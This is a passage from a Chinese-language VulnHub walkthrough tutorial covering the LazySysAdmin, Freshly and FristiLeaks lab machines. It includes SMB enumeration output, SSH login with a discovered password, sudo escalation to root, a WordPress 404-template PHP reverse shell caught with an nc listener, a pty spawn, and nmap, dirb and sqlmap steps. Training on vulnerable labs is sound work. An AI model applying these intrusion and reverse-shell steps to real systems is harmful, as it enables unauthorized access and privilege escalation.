//192.168.0.100/print$  Mapping: DENIED, Listing: N/A
//192.168.0.100/share$  Mapping: OK, Listing: OK
//192.168.0.100/IPC$    [E] Can't understand response:
WARNING: The "syslog" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 ===================================================== 
|    Password Policy Information for 192.168.0.100    |
 ===================================================== 
[+] Attaching to 192.168.0.100 using a NULL share
[+] Trying protocol 445/SMB...
[+] Found domain(s):
    [+] LAZYSYSADMIN
    [+] Builtin
[+] Password Info for Domain: LAZYSYSADMIN
    [+] Minimum password length: 5
    [+] Password history length: None
    [+] Maximum password age: Not Set
    [+] Password Complexity Flags: 000000
        [+] Domain Refuse Password Change: 0
        [+] Domain Password Store Cleartext: 0
        [+] Domain Password Lockout Admins: 0
        [+] Domain Password No Clear Change: 0
        [+] Domain Password No Anon Change: 0
        [+] Domain Password Complex: 0
    [+] Minimum password age: None
    [+] Reset Account Lockout Counter: 30 minutes 
    [+] Locked Account Duration: 30 minutes 
    [+] Account Lockout Threshold: None
    [+] Forced Log off Time: Not Set
[+] Retieved partial password policy with rpcclient:
Password Complexity: Disabled
Minimum Password Length: 5
 =============================== 
|    Groups on 192.168.0.100    |
 =============================== 
[+] Getting builtin groups:
[+] Getting builtin group memberships:
[+] Getting local groups:
[+] Getting local group memberships:
[+] Getting domain groups:
[+] Getting domain group memberships:
 ======================================================================== 
|    Users on 192.168.0.100 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
windows下获取共享资源
linux下获取共享资源
[I] Found new SID: S-1-5-21-2952042175-1524911573-1237092750
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\togie (Local User)
[+] Enumerating users using SID S-1-5-21-2952042175-1524911573-1237092750 and logon username '', 
password ''
S-1-5-21-2952042175-1524911573-1237092750-500 *unknown*\*unknown* (8)
S-1-5-21-2952042175-1524911573-1237092750-501 LAZYSYSADMIN\nobody (Local User)
S-1-5-21-2952042175-1524911573-1237092750-512 *unknown*\*unknown* (8)
S-1-5-21-2952042175-1524911573-1237092750-513 LAZYSYSADMIN\None (Domain Group)
S-1-5-21-2952042175-1524911573-1237092750-514 *unknown*\*unknown* (8)
 ============================================== 
|    Getting printer info for 192.168.0.100    |
 ============================================== 
No printers returned.
enum4linux complete on Thu Feb  1 00:46:33 2018
net use k: \\192.168.0.100\share$
mount -t cifs -o username='',password='' //192.168.0.100/share$ /mnt
发现两个关键的文件deets.txt和wp-conﬁg.php
尝试用上面获取的mysql账号密码去登录phpmyadmin，但是发现没一个表项可以查看。
5
另外，上面还有一个密码是12345，而且之前登录WordPress页面的时候，页面显示 My name is togie. ，所以可
以用账号： togie  密码： 12345 尝试登录ssh，发现可以成功登录。
有了root权限，就有权限查看目标文件/root/proof.txt，这样就算完成了整个游戏了。这里刚好togie有root权限，
所以尝试直接用sudo su切换到root权限，但是如果togie没有root权限，就需要通过其他方式来提权了。
togie@LazySysAdmin:~$ whoami
togie
togie@LazySysAdmin:~$ id
uid=1000(togie) gid=1000(togie) 
groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
togie@LazySysAdmin:~$ sudo su
[sudo] password for togie: 
root@LazySysAdmin:/home/togie# id
uid=0(root) gid=0(root) groups=0(root)
思路二
通过账号： Admin  密码： TogieMYSQL12345^^ 登录WordPress控制面板，向404.php页面模板插入PHP反弹shell
的代码。
编辑好后，点击下面的upload ﬁle应用，然后访问http://192.168.0.100/wordpress/?p=2
出现no tty present and no askpass program speciﬁed，刚好目标机有python环境，使用python派生个新的
shell。
但是不知道www-data的密码，所以接下来就要进行提权，先来看一下目标机的详细信息
root@kali:~# nc -vlp 1234
listening on [any] 1234 ...
192.168.0.100: inverse host lookup failed: Unknown host
connect to [192.168.0.109] from (UNKNOWN) [192.168.0.100] 36468
Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 
i686 i686 GNU/Linux
 16:03:42 up 6 min,  0 users,  load average: 0.01, 0.15, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ sudo su
sudo: no tty present and no askpass program specified
python -c 'import pty; pty.spawn("/bin/sh")'
所以用CVE-2017-1000112提权即可，但是目标机上没有gcc，这种情况，可以本地搭建和目标机一样的环境，在本
地编译好提权exp后，在目标机器上运行即可。
dirb安装方法（kali已自带）
参考链接：
VulnHub Walk-through – LazySysAdmin: 1
LazySysAdmin Vulnerable Machine Walk-through
第六节 Freshly
Vulnhub-TopHatSec: Freshly
靶机简介
下载链接
https://download.vulnhub.com/tophatsec/Freshly.ova
运行环境
Virtualbox
VM（运行会提示错误，给的解决链接已经404）
本靶机推荐使用Virtualbox搭建
说明
$ uname -r
4.4.0-31-generic
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.5 LTS
Release:    14.04
Codename:   trusty
wget https://svwh.dl.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
tar zxvf dirb222.tar.gz
cd dirb222/
apt-get install libcurl4-gnutls-dev
./configure && make
./dirb #运行即可
此靶机的目标是通过网络渗透进主机，并找到隐藏在敏感文件中的秘密。
运行环境
将下载的OVA文件导入进Virtualbox即可。
渗透思路
服务发现
端口扫描
操作系统识别
主要端口进一步扫描
80端口
8080
发现8080和443端口均为Web，使用了WordPress。
检测已知服务
对wordpress进行扫描
发现三个插件有安全问题，但是对进一步渗透帮助不大。在扫描同时，使用 nikto 对80进行目录扫描，发现
phpmyadmin和login.php
login.php
Sqlmap进行检测
存在注入
查看数据库
查看WordPress8080库找到wordpress的用户名和密码
登入后台，修改语言为中文
获取shell
wordpress有两种方式拿shell，一种是添加插件，将准备好的格式正确的shell添加到.zip上传。
还有一种是直接编辑
这里采用直接编辑的方式getshell。将shell写入404页面
本地开NC监听
访问404页面 Shell反弹
查看passwd
第七节 FristiLeaks v1.3
靶机信息
下载连接
https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrent https://download.vulnhub.com/fristilea
ks/FristiLeaks_1.3.ova
运行环境
Virtualbox （二选一)
Vnware Workstation player
设置
根据官网提供的说明，首先要将要求设置VMware虚拟机的MAC地址 08:00:27:A5:A6:76
然后开启VM
主机发现
Netdiscover –r 10.10.10.0/24
可以发现目标主机在10.10.10.132的位置
服务发现
nmap -sS -Pn -T4 -p- 10.10.10.132
可以看到打开了80端口，service为HTTP
详细扫描80端口
仅发现开放了80端口，对80端口进行详细探测：
nmap -A -O -p80 10.10.10.132
得到以下有价值的信息：
浏览一下web站点
根据nmap扫描的结果存在 robots.txt 文件，查看一下：
访问以下 robots.txt 提到的三个路径
三个目录内容相同，只有以上画面。
接着，枚举一下目录：
dirb http://10.10.10.132
Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
http-robots.txt: 3 disallowed entries
在 images 目录发现几张照片：
查看图片， keep-calm 似乎是一个提示
KEEP CALM AND DRINK FRISTI
尝试访问 http://10.10.10.132/fristi/
发现一个登陆口。登录界面存在一个严重安全问题，两个输入框都有自动完成的功能。（包括密码）   
扫描一下该目录：
dirb http://10.10.10.132/fristi/
发现了 upload 目录的index页面
查看源代码发现线索：
注释当中的信息表明，此页面是一个叫eezeepz的人留下来的。